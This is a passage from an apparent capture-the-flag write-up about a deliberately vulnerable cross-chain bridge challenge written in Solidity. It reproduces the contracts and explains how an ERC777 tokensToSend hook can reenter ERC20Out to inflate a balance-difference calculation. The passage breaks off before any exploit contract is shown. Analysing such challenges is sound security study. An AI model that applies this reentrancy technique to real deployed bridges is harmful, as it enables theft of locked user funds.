</span><span>            _remoteChainId, _remoteBridge, </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSelector</span><span>(Bridge.ethIn.</span><span style=color:#a71d5d;font-weight:700>selector</span><span>, _to)
</span><span>        );
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>ethIn</span><span>(</span><span style=color:#0086b3>address </span><span>_to) </span><span style=color:#a71d5d;font-weight:700>external payable onlyRemoteBridge </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>ETH_transfer</span><span>(_to, </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>);
</span><span>        Address.</span><span style=color:#62a35c>sendValue</span><span>(</span><span style=color:#0086b3>payable</span><span>(_to), </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>ERC20Out</span><span>(</span><span style=color:#0086b3>address </span><span>_token, </span><span style=color:#0086b3>address </span><span>_to, </span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#0086b3>ERC20_transfer</span><span>(_token, _to, _amount);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> _remoteChainId </span><span style=color:#a71d5d;font-weight:700>=</span><span> CHAIN_ID </span><span style=color:#a71d5d;font-weight:700>==</span><span> 1 </span><span style=color:#a71d5d;font-weight:700>?</span><span> 2 : 1;
</span><span>        </span><span style=color:#0086b3>address</span><span> _remoteBridge </span><span style=color:#a71d5d;font-weight:700>=</span><span> remoteBridge[_remoteChainId];
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(isBridgedERC20[_token]) {
</span><span>            </span><span style=color:#62a35c>BridgedERC20</span><span>(_token).</span><span style=color:#62a35c>burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _amount);
</span><span>            _token </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>BridgedERC20</span><span>(_token).</span><span style=color:#62a35c>REMOTE_TOKEN</span><span>();
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#0086b3>uint256</span><span> balance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>            </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), _amount), </span><span style=color:#183691>"T"</span><span>);
</span><span>            _amount </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>-</span><span> balance;
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>isTokenRegisteredAtRemote[_remoteChainId][_token]) {
</span><span>                </span><span style=color:#a71d5d;font-weight:700>this</span><span>.</span><span style=color:#62a35c>sendRemoteMessage</span><span>(
</span><span>                    _remoteChainId,
</span><span>                    _remoteBridge,
</span><span>                    </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSelector</span><span>(
</span><span>                        Bridge.</span><span style=color:#0086b3>ERC20Register</span><span>.</span><span style=color:#a71d5d;font-weight:700>selector</span><span>,
</span><span>                        _token,
</span><span>                        </span><span style=color:#0086b3>IERC20Metadata</span><span>(_token).</span><span style=color:#62a35c>name</span><span>(),
</span><span>                        </span><span style=color:#0086b3>IERC20Metadata</span><span>(_token).</span><span style=color:#62a35c>symbol</span><span>()
</span><span>                    )
</span><span>                );
</span><span>                isTokenRegisteredAtRemote[_remoteChainId][_token] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>            }
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>this</span><span>.</span><span style=color:#62a35c>sendRemoteMessage</span><span>(
</span><span>            _remoteChainId, _remoteBridge, </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSelector</span><span>(Bridge.</span><span style=color:#0086b3>ERC20In</span><span>.</span><span style=color:#a71d5d;font-weight:700>selector</span><span>, _token, _to, _amount)
</span><span>        );
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>ERC20Register</span><span>(</span><span style=color:#0086b3>address </span><span>_remoteToken, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>_name, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>_symbol)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>external
</span><span>        </span><span style=color:#a71d5d;font-weight:700>onlyRemoteBridge
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#0086b3>ERC20_register</span><span>(_remoteToken, _name, _symbol);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(remoteTokenToLocalToken[_remoteToken] </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>            </span><span style=color:#0086b3>address</span><span> _token </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>new </span><span style=color:#62a35c>BridgedERC20</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _remoteToken, _name, _symbol));
</span><span>            remoteTokenToLocalToken[_remoteToken] </span><span style=color:#a71d5d;font-weight:700>=</span><span> _token;
</span><span>            isBridgedERC20[_token] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>ERC20In</span><span>(</span><span style=color:#0086b3>address </span><span>_token, </span><span style=color:#0086b3>address </span><span>_to, </span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external payable onlyRemoteBridge </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#0086b3>ERC20_transfer</span><span>(_token, _to, _amount);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(remoteTokenToLocalToken[_token] </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>            </span><span style=color:#62a35c>BridgedERC20</span><span>(remoteTokenToLocalToken[_token]).</span><span style=color:#62a35c>mint</span><span>(_to, _amount);
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>transfer</span><span>(_to, _amount), </span><span style=color:#183691>"T"</span><span>);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sendRemoteMessage</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_targetChainId, </span><span style=color:#0086b3>address </span><span>_targetAddress, </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>_message)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>public
</span><span>        </span><span style=color:#a71d5d;font-weight:700>payable
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#183691>"S"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_targetChainId </span><span style=color:#a71d5d;font-weight:700>!=</span><span> CHAIN_ID, </span><span style=color:#183691>"C"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(_targetAddress </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>address</span><span>(0), </span><span style=color:#183691>"A"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>SendRemoteMessage</span><span>(_targetChainId, _targetAddress, </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>, msgNonce, _message);
</span><span>        
</span><span>        </span><span style=color:#0086b3>uint256</span><span> _sourceChainId </span><span style=color:#a71d5d;font-weight:700>=</span><span> CHAIN_ID;
</span><span>        </span><span style=color:#0086b3>address</span><span> _sourceAddress </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>);
</span><span>
</span><span>        </span><span style=color:#0086b3>bytes32</span><span> h </span><span style=color:#a71d5d;font-weight:700>= keccak256</span><span>(
</span><span>            </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSignature</span><span>(
</span><span>                </span><span style=color:#183691>"relayMessage(address,uint256,address,uint256,uint256,bytes)"</span><span>,
</span><span>                _targetAddress,
</span><span>                _sourceChainId,
</span><span>                _sourceAddress,
</span><span>                </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>,
</span><span>                msgNonce,
</span><span>                _message
</span><span>            )
</span><span>        );
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(relayedMessages[h] </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>false</span><span>, </span><span style=color:#183691>"H"</span><span>);
</span><span>        relayedMessages[h] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#62a35c>RelayedMessage</span><span>(h);
</span><span>        relayedMessageSenderChainId </span><span style=color:#a71d5d;font-weight:700>=</span><span> _sourceChainId;
</span><span>        relayedMessageSenderAddress </span><span style=color:#a71d5d;font-weight:700>=</span><span> _sourceAddress;
</span><span>        (</span><span style=color:#0086b3>bool</span><span> success, </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory</span><span> result) </span><span style=color:#a71d5d;font-weight:700>=</span><span> _targetAddress.</span><span style=color:#a71d5d;font-weight:700>call</span><span>{value: </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>}(_message);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(success, </span><span style=color:#0086b3>string</span><span>(result));
</span><span>        relayedMessageSenderChainId </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        relayedMessageSenderAddress </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>address</span><span>(0);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>unchecked </span><span>{
</span><span>            </span><span style=color:#a71d5d;font-weight:700>++</span><span>msgNonce;
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Token </span><span style=color:#a71d5d;font-weight:700>is ERC777 </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>user, </span><span style=color:#0086b3>address</span><span>[] </span><span style=color:#a71d5d;font-weight:700>memory </span><span>a) </span><span style=color:#62a35c>ERC777</span><span>(</span><span style=color:#183691>"Token"</span><span>, </span><span style=color:#183691>"Tok"</span><span>, a) {
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>100 ether</span><span>, </span><span style=color:#183691>""</span><span>, </span><span style=color:#183691>""</span><span>, </span><span style=color:#0086b3>false</span><span>);
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(user, 1 ether, </span><span style=color:#183691>""</span><span>, </span><span style=color:#183691>""</span><span>, </span><span style=color:#0086b3>false</span><span>);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>BridgedERC20 </span><span style=color:#a71d5d;font-weight:700>is ERC20 </span><span>{
</span><span>    Bridge </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>BRIDGE;
</span><span>    Bridge </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>REMOTE_BRIDGE;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> REMOTE_TOKEN;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>onlyBridge</span><span>() {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == </span><span style=color:#0086b3>address</span><span>(BRIDGE), </span><span style=color:#183691>"B"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>onlyRemoteBridge</span><span>() {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == </span><span style=color:#0086b3>address</span><span>(BRIDGE), </span><span style=color:#183691>"RB1"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(
</span><span>            REMOTE_BRIDGE.</span><span style=color:#62a35c>relayedMessageSenderChainId</span><span>() </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0
</span><span>                </span><span style=color:#a71d5d;font-weight:700>&&</span><span> BRIDGE.</span><span style=color:#62a35c>remoteBridgeChainId</span><span>(REMOTE_BRIDGE.</span><span style=color:#62a35c>relayedMessageSenderAddress</span><span>()) </span><span style=color:#a71d5d;font-weight:700>==</span><span> REMOTE_BRIDGE.</span><span style=color:#62a35c>relayedMessageSenderChainId</span><span>(),
</span><span>            </span><span style=color:#183691>"RB2"
</span><span>        );
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_remoteBridge, </span><span style=color:#0086b3>address </span><span>_remoteToken, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>_name, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>_symbol) </span><span style=color:#62a35c>ERC20</span><span>(_name, _symbol) {
</span><span>        BRIDGE </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Bridge</span><span>(</span><span style=color:#0086b3>payable</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>));
</span><span>        REMOTE_BRIDGE </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Bridge</span><span>(</span><span style=color:#0086b3>payable</span><span>(_remoteBridge));
</span><span>        REMOTE_TOKEN </span><span style=color:#a71d5d;font-weight:700>=</span><span> _remoteToken;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(</span><span style=color:#0086b3>address </span><span>_to, </span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external onlyRemoteBridge </span><span>{
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(_to, _amount);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>burn</span><span>(</span><span style=color:#0086b3>address </span><span>_from, </span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external onlyBridge </span><span>{
</span><span>        </span><span style=color:#62a35c>_burn</span><span>(_from, _amount);
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-6>Solution</h2><p>Yes man, bridges.. More interesting and I personally I love bridges. Let's do this as quick as possible.<p>Lets, break down the Bridge protocol.<ol><li><p><strong>Bridge (Main Contract)</strong></p> <ul><li>Handles cross-chain messaging and token transfers<li>Manages remote bridge registrations and token registrations<li>Key functions: <ul><li><code>ethOut/ethIn</code>: Handles ETH transfers between chains<li><code>ERC20Out/ERC20In</code>: Handles ERC20 token transfers<li><code>ERC20Register</code>: Registers new tokens on remote chains<li><code>sendRemoteMessage</code>: Core function for sending messages between chains</ul></ul><li><p><strong>BridgedERC20</strong></p> <ul><li>Special ERC20 token for cross-chain transfers<li>Can only be minted by remote bridge and burned by local bridge<li>Tracks the remote token address and bridge contracts<li>Implements strict access controls for minting/burning</ul><li><p><strong>Token</strong></p> <ul><li>Simple ERC777 token used in the challenge<li>Mints initial tokens to deployer and user</ul></ol><p>This is not a complete bridge protocol because there is no off-chain componets like relayers, etc. But all the things were replicated in the smart contract itself. Because of this it's confusing to understand which one is source contract and which one is destination contract.<p>Just follow me, <code>remoteBridge</code> means destination bridge, <code>ethOut()</code> or <code>ERC20Out()</code> means that the source contract is sending to destination contract. <code>ethIn()</code> or <code>ERC20In()</code> are the functions which usually called by off-chain components like relayer but here the source contract directly calls these functions on destination contract. Here <code>ethIn()</code> or <code>ERC20In()</code> are restricted to be only calleable by the remote bridge. <code>ERC20Register()</code> is to deploy a equivalent token (wrapped) on the destination for a token on source chain. Here, If the token was not registered the on the first bridging of that token the registration and the deployment of wrapped token will be done automatically. The wrapped token which is going to be deployed for a token on source chain is <code>BridgedERC20</code> token. Token we are going to bridge is <code>Token</code> an <code>ERC777</code>.<p>Usually asset moving bridges will follow following modes of bridging.<ul><li><strong>Lock</strong> asset on source chain then <strong>Mint</strong> a wrapped asset on destination<li><strong>Burn</strong> and <strong>Mint</strong><li><strong>Lock</strong> and <strong>Release</strong><li><strong>Burn</strong> and <strong>Mint</strong></ul><p>Here in this protocol the <strong>Lock</strong> and <strong>Mint</strong> in forward direction and when the same Wrapped token bridged back to source then the <strong>Burn</strong> and <strong>Release</strong> happens. (I'd love to explain all these in a dedicated blog post)<p><code>sendRemoteMessage()</code> function will log a message to be picked up by the off-chain relayer and send it to destination. But here all this relayer functionality was implemented in this function itself. It was restricted to be calling from by anyone else except the same contract functions with the following check. If this check was not there we could've simply call this to perform an attack. But no luck, we can't do this.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>require(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#183691>"S"</span><span>);
</span></code></pre><p>But the <code>sendRemoteMessage()</code> function is called by the <code>ethOut()</code> or <code>ERC20Out()</code> and then the call goes to <code>ethIn()</code> or <code>ERC20In()</code>.<pre style=color:#323232;background-color:#fff><code><span>USER -> ethOut()/ERC20Out()  -> sendRemoteMessage() -> ethIn()/ERC20In() -> USER (mint/release tokens)
</span></code></pre><p>Let's get the initial state of the protocol,<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>Bridge:  0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba
</span><span>FLAG_TOKEN:  0x7a072D0a5C338679Da17C4922C364c03167D1fB2 (ERC777)
</span><span>Player balance of FLAG :  1000000000000000000
</span><span>SOURCE Bridge balance of FLAG :  100000000000000000000
</span><span>SOURCE CHAIN_ID :  1
</span><span>Total Default operators of FLAG :  0
</span><span>REMOTE CHAIN_ID :  2
</span><span>REMOTE Bridge:  0xd73fFbbd87624b59e166717676F0e10135C9fe3B
</span><span>REMOTE Bridge balance:  0
</span></code></pre><p>Expected initial data..<p>How can we bridge the <code>1e18</code> of ERC777 Token that we got? By calling <code>ERC20Out()</code><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>ERC20Out</span><span>(</span><span style=color:#0086b3>address </span><span>_token, </span><span style=color:#0086b3>address </span><span>_to, </span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>external </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>emit </span><span style=color:#0086b3>ERC20_transfer</span><span>(_token, _to, _amount);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> _remoteChainId </span><span style=color:#a71d5d;font-weight:700>=</span><span> CHAIN_ID </span><span style=color:#a71d5d;font-weight:700>==</span><span> 1 </span><span style=color:#a71d5d;font-weight:700>?</span><span> 2 : 1;
</span><span>        </span><span style=color:#0086b3>address</span><span> _remoteBridge </span><span style=color:#a71d5d;font-weight:700>=</span><span> remoteBridge[_remoteChainId];
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(isBridgedERC20[_token]) {
</span><span>            </span><span style=color:#62a35c>BridgedERC20</span><span>(_token).</span><span style=color:#62a35c>burn</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, _amount);
</span><span>            _token </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>BridgedERC20</span><span>(_token).</span><span style=color:#62a35c>REMOTE_TOKEN</span><span>();
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#0086b3>uint256</span><span> balance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>            </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), _amount), </span><span style=color:#183691>"T"</span><span>);
</span><span>            _amount </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>-</span><span> balance;
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>isTokenRegisteredAtRemote[_remoteChainId][_token]) {
</span><span>                </span><span style=color:#a71d5d;font-weight:700>this</span><span>.</span><span style=color:#62a35c>sendRemoteMessage</span><span>(
</span><span>                    _remoteChainId,
</span><span>                    _remoteBridge,
</span><span>                    </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSelector</span><span>(
</span><span>                        Bridge.</span><span style=color:#0086b3>ERC20Register</span><span>.</span><span style=color:#a71d5d;font-weight:700>selector</span><span>,
</span><span>                        _token,
</span><span>                        </span><span style=color:#0086b3>IERC20Metadata</span><span>(_token).</span><span style=color:#62a35c>name</span><span>(),
</span><span>                        </span><span style=color:#0086b3>IERC20Metadata</span><span>(_token).</span><span style=color:#62a35c>symbol</span><span>()
</span><span>                    )
</span><span>                );
</span><span>                isTokenRegisteredAtRemote[_remoteChainId][_token] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>            }
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>this</span><span>.</span><span style=color:#62a35c>sendRemoteMessage</span><span>(
</span><span>            _remoteChainId, _remoteBridge, </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSelector</span><span>(Bridge.</span><span style=color:#0086b3>ERC20In</span><span>.</span><span style=color:#a71d5d;font-weight:700>selector</span><span>, _token, _to, _amount)
</span><span>        );
</span><span>    }
</span></code></pre><p>Observing the above function, if the token that we are sending is <code>BridgedERC20</code> then the burn happens. If not the lock happens. Nothing exciting in the if block. But in the else block the lock of our token happens (ERC777).<p>Can you see the problem of these three lines???<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#0086b3>uint256</span><span> balance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>require(</span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>transferFrom</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), _amount), </span><span style=color:#183691>"T"</span><span>);
</span><span>_amount </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(_token).</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)) </span><span style=color:#a71d5d;font-weight:700>-</span><span> balance;
</span></code></pre><p>I can see it.. The <code>balance</code> is fetched on line 1 then same balance is used after the <code>trnasferFrom()</code> call. What is anybody can <strong>reenter</strong> from that transferFrom call?? With standard ERC20 token transfers it's not possible. But it is possible from the <code>ERC777</code> transfers bacause of an extra feature called Hooks and Callbacks.<p><em>"Hooks in ERC777 tokens serve as entry points for custom code execution during token transfers. They allow external smart contracts to intervene in the token transfer process, either before or after the transfer occurs. This flexibility is a double-edged sword, as it can be used for legitimate purposes but also exploited for malicious actions."</em> - Johny<h3 id=erc777>ERC777</h3><p>The following are the functions of ERC777 standard. In the <code>transferFrom()</code> the contract will call the <code>_send()</code> hook, there in the hook if the sender is registered a <code>IERC777Sender</code> interface implementer in the <code>_ERC1820_REGISTRY</code> contract then the hook will call the <code>tokensToSend()</code> function on the implementor. Here the user is the sender but the implementor is someother contract registered by the user as his <code>IERC777Sender</code> implementor. Look at the following control flow for better understanding.<pre style=color:#323232;background-color:#fff><code><span>User -> Deploys a contract -> Declares the contract as willing to be an implementer 
</span><span>User -> transferFrom() -> _send() -> _callTokensToSend() -> user Implementor.tokensToSend()
</span></code></pre><p>Okay, enough reconnaissance. Now we know the it is possible to reenter to back to the <code>ERC20Out()</code> function with callback hooks of <code>ERC777</code> via the <code>ERC-1820 registry</code>,<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>holder,
</span><span>        </span><span style=color:#0086b3>address </span><span>recipient,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>public virtual override returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#0086b3>address</span><span> spender </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_msgSender</span><span>();
</span><span>        </span><span style=color:#62a35c>_spendAllowance</span><span>(holder, spender, amount);
</span><span>        </span><span style=color:#62a35c>_send</span><span>(holder, recipient, amount, </span><span style=color:#183691>""</span><span>, </span><span style=color:#183691>""</span><span>, </span><span style=color:#0086b3>false</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_send</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>from,
</span><span>        </span><span style=color:#0086b3>address </span><span>to,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>amount,
